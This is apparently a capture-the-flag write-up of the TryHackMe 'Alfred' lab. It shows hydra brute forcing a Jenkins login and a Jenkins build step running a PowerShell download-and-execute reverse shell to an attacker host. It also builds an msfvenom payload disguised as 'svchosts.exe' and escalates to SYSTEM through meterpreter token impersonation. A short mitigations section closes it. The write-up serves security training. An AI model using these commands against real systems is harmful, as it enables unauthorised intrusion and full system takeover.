# THM - Alfred Write-Up

"In this room, we'll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made change to it). After which, we'll use an interesting privilege escalation method to get full system access."

## Task 1: Initial Access

**How many ports are open? (TCP only)**

As always, we're going to start with an aggressive nmap scan on all ports with very verbose output.

```
nmap 10.10.27.251 -p- -A -vv
```

Running this scan, we've come across an issue. The box is blocking the ping probes. We can get around this by adding -Pn to the end of our nmap to skip host discovery.

Success, we can now see that there are 3 open ports. Luckily, they're all useful.

* 8080 Jetty(9.4.z-SNAPSHOT)
* 3389 RDP
* 80 Website

While we wait for the SYN Stealth Scan, let's go checkout the website on port 80.

We can gather some information from the site, **alfred@wayneenterprises[.]com**

**What is the username and password for the log in panel(in the format username:password)**

From the website, we can assume that a username will be alfred. We also have the domain of the emails which may be needed later. Unfortunately, I see no extra information from the source.

Now that the nmap is complete, we can see that this is a Microsoft Windows Server 2012 R2 that is running Jetty(9.4.z-SNAPSHOT) on port 8080. Let's try to visit that web server in our browser.

On MACHINE_IP:8080 we can see that there is a Jenkins login form. Let's try to find a way to login to alfred. When we view the source we can see the field names are j_username:j_password and that the error message displayed with incorrect credentials is "Invalid username or password". This will be useful if we need to use hydra to attempt to bruteforce the login form. 

Let's try to login to alfred with some common passwords to test if it will lock out the account for incorrect attempts. It looks like Jenkins doesn't have an attempt limit so let's try a bruteforce with the wellknown password list [rockyou.txt](https://www.kaggle.com/wjburns/common-password-list-rockyoutxt)

We're going to use hydra to do this but first we need to get the action and method.
* Action: j_acegi_security_check
* Method: Post

```
hydra -s 8080 -l afred -P /usr/share/wordlists/rockyou.txt 10.10.27.251 http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&Login=:Invalid username or password." 
```

Unfortunately, after a few minutes I'm going to be moving on from this. Let's go look at jenkins while this is running in the background and find out what the default administrative user is named. Maybe we can get in with default credentials.

After some research, it looks like the default administrator username for jenkins is "admin". Let's run hydra with the http_default_pass.txt in metasploit wordlists to try and get into this account.

```
hydra -s 8080 -l admin -P /usr/share/wordlists/metasploit/http_default_pass.txt 10.10.27.251 http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&Login=:Invalid username or password."

```

Perfect, not only did we get an account... we got access to the admin account.

Since earlier we saw that 3389 was open, let's take a shot in the dark and try to RDP with the admin:admin credentials. No luck here, but was worth a try.

Let's login on port 8080 and take a look around.
* Go to people section to look for other users - none seen.
* Go to credentials - nothing seen here
* Go to manage jenkins - this shows that there is a lot of vulnerabilities with this Jenkins server.
* Scroll down in manage jenkins to Configure Global Security and disable it, turn off CSRF Protection and save.

Let's now try to search for a way to execute commands on the server so we can try and get a shell.

If we go to jobs>project>configure we can scroll down to the Build section and see that it executes a Windows batch command. It looks like the default command is a whoami.

Lets test this out to get some information. If we go to builds and view the console output, we can see the result of our script.

```
Started by user unknown or anonymous
Running as SYSTEM
Building in workspace C:\Program Files (x86)\Jenkins\workspace\project
[project] $ cmd /c call C:\Users\bruce\AppData\Local\Temp\jenkins822259080465788895.bat

C:\Program Files (x86)\Jenkins\workspace\project>whoami
alfred\bruce

C:\Program Files (x86)\Jenkins\workspace\project>exit 0 
Finished: SUCCESS
```

So it looks like Jenkins executes the commands as system but has access to a user (alfred/bruce) if we were to get a shell. Let's check and see if we can use powershell. We're in luck, the cmd can launch powershell. Let's use [nishang](https://github.com/samratashok/nishang) and transfer Invoke-PowerShellTcp.ps1 to the server using Jenkins and a Simple HTTP server. We will want to launch a netcat listener before we do this, to pickup the shell.

* Move the terminals location to the directory containing Invoke-PowerShellTcp.ps1 and start the server (I made one for this room named Alfred).

```
python3 -m http.server
```

* Start netcat listener on port 4444 using rlwrap so that we can use the arrow keys to move around in the terminal once we get a shell.

```
rlwrap nc -lvnp 4444
```

* Update and build the powershell command in Jenkins to transfer the Invoke-PowerShellTcp.ps1 from the server to the target and execute the script.

```ps
powershell iex (New-Object Net.WebClient).DownloadString('http://Tun0-IP:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress Tun0-IP -Port 4444
```

WIN!

```
rlwrap nc -lvnp 4444                                                                                                                                        9 âš™

**What is the user.txt flag?**

Now, we can begin looking for the user.txt flag! Use type user.txt to read the file in powershell.

## Task 2: Switching Shells

Now it's time to try and escalate our privileges. First, lets get an improved shell on the device. We are going to use msfvenom to create a reverse shell payload. We should encode it and name it similarly to a legitimate binary service to avoid detection.

'''
msfvenom -p windows/shell_reverse_tcp LHOST=Tun0-IP LPORT=5555 -e x86/shikata_ga_nai -f exe -o svchosts.exe  
'''

**What is the final size of the exe payload that you generated?**

After creating the payload, we will see the final size for our fake service host in the output.

Now that we have our payload, we need to transfer it onto the target and catch it with metasploit multi handler.

Let's transfer it using our powershell session we got earlier with netcat off the server. Navigate to C:\Perflogs and then transfer the file off the server onto the target.

```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://Tun0-IP:8000/svchosts.exe','svchosts.exe')"
```

Now use ls to make sure it was transfered successfully. Perfect, we see svchosts.exe in PerfLogs.

Let's jump over and start up a metasploit session using exploit/multi/handler before we launch the binary.

Check to make sure the payload is correctly set to windows/meterpreter/reverse_tcp. It should be the default when opening msfconsole.

Show options and set the LPORT to 5555, along with the LHOST to the Tun0-IP. Run the exploit and execute the binary on the device with the netcat powershell session.

```ps
Start-Process "svchosts.exe" 
```

Now, check your listener in metasploit and you should see the command shell session opened. Let's go ahead and view privileges with whoami /priv.

Luckily for us, we can see [SeDebugPrivilege, SeImpersonatePrivilege](https://www.exploit-db.com/papers/42556) are both enabled. Exit the cmd session, and use the metasploit incognito module with meterpreter. Then, list the tokens.

**To check which tokens are available, enter the list_tokens -g. We can see that the BUILTIN\Administrators token is available. Use the impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators token. What is the output when you run the getuid command?**

```
load incognito
list_tokens -g
impersonate_token "BUILTIN\Administrators"
getuid
```

Rooted! We were able to escalate to NT AUTHORITY\SYSTEM by impersonating an Administrator [token](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens). However, we might not have the permissions of system yet.

["this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do"](https://tryhackme.com/room/alfred). 

Due to this, we must migrate to a process that has SYSTEM permissions.

We can do this by using ps to find a PID to migrate to that is running as SYSTEM. We are going to use services.exe.

```
migrate services.exePID
```

**read the root.txt file at C:\Windows\System32\config**

Now we can cd to the given directory and use more root.txt to see the flag!

### Congratulations! You're done with the room!

## Mitigations

### Initial Access

* Change off the default admin account name to avoid brute-forcing
* Do not use admin;admin

### Privilege Escalation

* Ensure that SeImpersonatePrivilege and SeDebugPrivilege are disabled. These are commonly abused.

### Other Recommended Changes

*  Upgrade to Jenkins (2.249.1)
*  Go to the plugin manager and update plugins to patch other vulnerabilities.
